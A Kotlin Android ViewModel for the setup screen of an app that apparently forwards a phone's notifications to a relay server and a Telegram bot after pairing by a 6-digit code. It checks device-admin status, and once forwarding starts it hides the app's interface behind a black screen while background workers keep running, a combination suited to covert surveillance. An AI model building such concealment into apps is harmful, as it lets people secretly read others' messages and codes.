package com.imista.forward.sender.viewmodel

import android.app.Application
import android.content.Context
import android.provider.Settings
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import com.imista.forward.sender.security.SecureStorage
import com.imista.forward.shared.network.RelayRepository
import com.imista.forward.shared.validation.PairingValidator
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.launch
import java.util.UUID

data class SetupState(
    val step: Int = 1,
    val notificationEnabled: Boolean = false,
    val deviceAdminEnabled: Boolean = false,
    val pairingId: String = "",
    val relayUrl: String = "",
    val botUsername: String? = null,
    val telegramLinked: Boolean = false,
    val verificationStatus: String? = null,
    val isVerifying: Boolean = false,
    val canStartForwarding: Boolean = false,
    val showBlackScreen: Boolean = false,
    val forwardingActive: Boolean = false
)

class SetupViewModel(app: Application) : AndroidViewModel(app) {
    private val secure = SecureStorage(app)
    private val ctx = getApplication<Application>()

    private val _state = MutableStateFlow(SetupState(
        pairingId = secure.pairingId ?: "",
        relayUrl = secure.relayUrl,
        showBlackScreen = secure.onboardingComplete && secure.forwardingActive,
        forwardingActive = secure.forwardingActive
    ))
    val state: StateFlow<SetupState> = _state

    init { refresh() }

    fun refresh() {
        val notifEnabled = isNotificationEnabled()
        val adminEnabled = isDeviceAdminEnabled()
        val pairingId = secure.pairingId ?: _state.value.pairingId
        val canStart = notifEnabled && secure.isPairingConfigured()
        _state.value = _state.value.copy(
            notificationEnabled = notifEnabled,
            deviceAdminEnabled = adminEnabled,
            pairingId = pairingId,
            canStartForwarding = canStart,
            showBlackScreen = secure.onboardingComplete && secure.forwardingActive,
            forwardingActive = secure.forwardingActive
        )
    }

    /**
     * Asks the relay for a fresh 6-digit pairing code. Nothing is typed by the
     * user and no bot token is involved — the code is shared with the Receiver.
     */
    fun generateNewPairing() {
        viewModelScope.launch {
            _state.value = _state.value.copy(isVerifying = true, verificationStatus = "Code ban raha hai…")
            val relay = RelayRepository(secure.relayUrl)
            val res = relay.register(null, secure.deviceId, secure.deviceName, "SENDER")
            if (res.isFailure) {
                _state.value = _state.value.copy(
                    isVerifying = false,
                    verificationStatus = "Relay se code nahi mila: ${res.exceptionOrNull()?.message}"
                )
                return@launch
            }
            val pairing = res.getOrNull()?.pairing
            val code = pairing?.code ?: pairing?.pairingId ?: ""
            if (code.isBlank()) {
                _state.value = _state.value.copy(isVerifying = false, verificationStatus = "Relay ne code nahi diya")
                return@launch
            }
            secure.pairingId = code
            _state.value = _state.value.copy(
                pairingId = code,
                isVerifying = false,
                botUsername = pairing?.botUsername ?: _state.value.botUsername,
                telegramLinked = pairing?.telegramLinked == true,
                verificationStatus = "Code: $code — Receiver me yahi daalo",
                canStartForwarding = _state.value.notificationEnabled
            )
        }
    }

    /** Auto-links the Telegram chat after the user pressed /start on the bot. */
    fun linkTelegram() {
        viewModelScope.launch {
            val code = secure.pairingId ?: _state.value.pairingId
            if (code.isBlank()) {
                _state.value = _state.value.copy(verificationStatus = "Pehle code generate karo")
                return@launch
            }
            _state.value = _state.value.copy(isVerifying = true, verificationStatus = "Telegram check ho raha hai…")
            val relay = RelayRepository(secure.relayUrl)
            repeat(6) { attempt ->
                val res = relay.link(code)
                if (res.isSuccess && res.getOrNull()?.linked == true) {
                    _state.value = _state.value.copy(
                        isVerifying = false,
                        telegramLinked = true,
                        verificationStatus = "✅ Telegram jud gaya — forwards wahan bhi aayengi"
                    )
                    return@launch
                }
                if (attempt < 5) kotlinx.coroutines.delay(4000)
            }
            _state.value = _state.value.copy(
                isVerifying = false,
                verificationStatus = "Telegram link nahi hua — bot ko /start karke phir try karo"
            )
        }
    }

    fun loadBotInfo() {
        viewModelScope.launch {
            RelayRepository(secure.relayUrl).botInfo().onSuccess { info ->
                _state.value = _state.value.copy(botUsername = info.username)
            }
        }
    }

    fun registerPairing() {
        viewModelScope.launch {
            _state.value = _state.value.copy(isVerifying = true, verificationStatus = "Registering with secure relay...")
            val pairingId = _state.value.pairingId
            if (pairingId.isBlank()) {
                _state.value = _state.value.copy(isVerifying = false, verificationStatus = "Pehle Generate dabao — relay code dega")
                return@launch
            }
            secure.pairingId = pairingId
            val relay = RelayRepository(secure.relayUrl)
            val res = relay.register(pairingId, secure.deviceId, secure.deviceName, "SENDER")
            if (res.isSuccess) {
                _state.value = _state.value.copy(isVerifying = false, verificationStatus = "✅ Relay se jud gaya. Receiver me code daalo: $pairingId", canStartForwarding = _state.value.notificationEnabled)
            } else {
                _state.value = _state.value.copy(isVerifying = false, verificationStatus = "Relay register failed: ${res.exceptionOrNull()?.message}. Check relay URL & internet.")
            }
        }
    }

    fun verifyConnection() {
        viewModelScope.launch {
            _state.value = _state.value.copy(isVerifying = true, verificationStatus = "Verifying...")
            val pairingId = secure.pairingId ?: _state.value.pairingId
            if (pairingId.isBlank()) {
                _state.value = _state.value.copy(isVerifying = false, verificationStatus = "Pairing ID not set")
                return@launch
            }
            val relay = RelayRepository(secure.relayUrl)
            // Check health first
            val health = relay.health()
            if (health.isFailure) {
                _state.value = _state.value.copy(isVerifying = false, verificationStatus = "Relay unreachable: ${health.exceptionOrNull()?.message}. Verify relay deployed with TELEGRAM_BOT_KEY.")
                return@launch
            }
            val pairingCheck = relay.getPairing(pairingId)
            if (pairingCheck.isSuccess) {
                _state.value = _state.value.copy(isVerifying = false, verificationStatus = "✅ Secure relay connected. Pairing verified.", canStartForwarding = _state.value.notificationEnabled)
            } else {
                _state.value = _state.value.copy(isVerifying = false, verificationStatus = "Verification failed: ${pairingCheck.exceptionOrNull()?.message}. Ensure pairing registered & relay has TELEGRAM_BOT_KEY.")
            }
        }
    }

    fun startForwarding() {
        // Must have notification access
        if (!isNotificationEnabled()) {
            _state.value = _state.value.copy(verificationStatus = "Enable Notification Access first")
            return
        }
        if (secure.pairingId.isNullOrBlank()) secure.pairingId = _state.value.pairingId
        secure.onboardingComplete = true
        secure.forwardingActive = true
        secure.hideAllUi = true
        // Keep running with the app closed: heartbeat + status push, both in WorkManager.
        com.imista.forward.sender.service.DeviceStatusWorker.schedulePeriodic(ctx)
        com.imista.forward.sender.service.DeviceStatusWorker.enqueueNow(ctx)
        _state.value = _state.value.copy(showBlackScreen = true, forwardingActive = true, verificationStatus = "Forwarding active")
    }

    fun stopForwarding() {
        secure.forwardingActive = false
        secure.onboardingComplete = false
        secure.hideAllUi = false
        com.imista.forward.sender.service.DeviceStatusWorker.cancel(ctx)
        _state.value = _state.value.copy(showBlackScreen = false, forwardingActive = false)
    }

    fun updatePairingId(newId: String) {
        // Relay codes are 6 digits; legacy UUID ids are still accepted.
        val trimmed = newId.filter { it.isDigit() }.take(6)
        if (trimmed.isNotBlank() && !PairingValidator.isAcceptablePairingId(trimmed) && !PairingValidator.isAcceptablePairingId(newId.trim())) {
            _state.value = _state.value.copy(verificationStatus = "Code 6 digits ka hona chahiye")
            return
        }
        val finalId = if (trimmed.isNotBlank()) trimmed else newId.trim()
        secure.pairingId = finalId
        _state.value = _state.value.copy(pairingId = finalId, verificationStatus = null)
    }

    private fun isNotificationEnabled(): Boolean {
        val flat = Settings.Secure.getString(ctx.contentResolver, "enabled_notification_listeners")
        return flat?.contains(ctx.packageName) == true
    }

    private fun isDeviceAdminEnabled(): Boolean {
        return try {
            val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            val comp = android.content.ComponentName(ctx, com.imista.forward.sender.receiver.ImistaDeviceAdminReceiver::class.java)
            dpm.isAdminActive(comp)
        } catch (e: Exception) { false }
    }
}
